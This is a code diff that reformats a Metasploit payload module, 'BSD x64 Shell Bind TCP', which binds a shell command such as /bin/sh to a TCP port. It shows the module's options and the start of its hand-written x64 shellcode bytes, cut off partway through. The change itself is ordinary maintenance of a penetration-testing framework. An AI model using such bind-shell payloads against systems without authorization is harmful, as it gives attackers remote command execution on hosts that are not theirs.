@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-require 'msf/core/handler/bind_tcp'
-
 module MetasploitModule
-
   CachedSize = 136
 
   include Msf::Payload::Single
@@ -16,35 +11,38 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'BSD x64 Shell Bind TCP',
-      'Description'   => 'Bind an arbitrary command to an arbitrary port',
-      'Author'        => [
-        'nemo <nemo[at]felinemenace.org>',
-        'joev'
-      ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'bsd',
-      'Arch'          => ARCH_X86_64,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShellUnix
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'BSD x64 Shell Bind TCP',
+        'Description' => 'Bind an arbitrary command to an arbitrary port',
+        'Author' => [
+          'nemo <nemo[at]felinemenace.org>',
+          'joev'
+        ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'bsd',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::CommandShellUnix
+      )
+    )
 
     # exec payload options
     register_options(
       [
-        OptString.new('CMD',  [ true,  "The command string to execute", "/bin/sh" ]),
+        OptString.new('CMD', [ true, 'The command string to execute', '/bin/sh' ]),
         Opt::LPORT(4444)
-    ], self.class)
+      ]
+    )
   end
 
   # build the shellcode payload dynamically based on the user-provided CMD
-  def generate
-    cmd  = (datastore['CMD'] || '') + "\x00"
+  def generate(_opts = {})
+    cmd = (datastore['CMD'] || '') + "\x00"
     port = [datastore['LPORT'].to_i].pack('n')
     call = "\xe8" + [cmd.length].pack('V')
-    payload =
-      "\x31\xc0" +                 # xor eax,eax
+    "\x31\xc0" + # xor eax,eax
       "\x83\xc0\x61" +             # add eax,0x61
       "\x6A\x02" +                 # push byte 0x1
       "\x5f" +                     # pop rdi
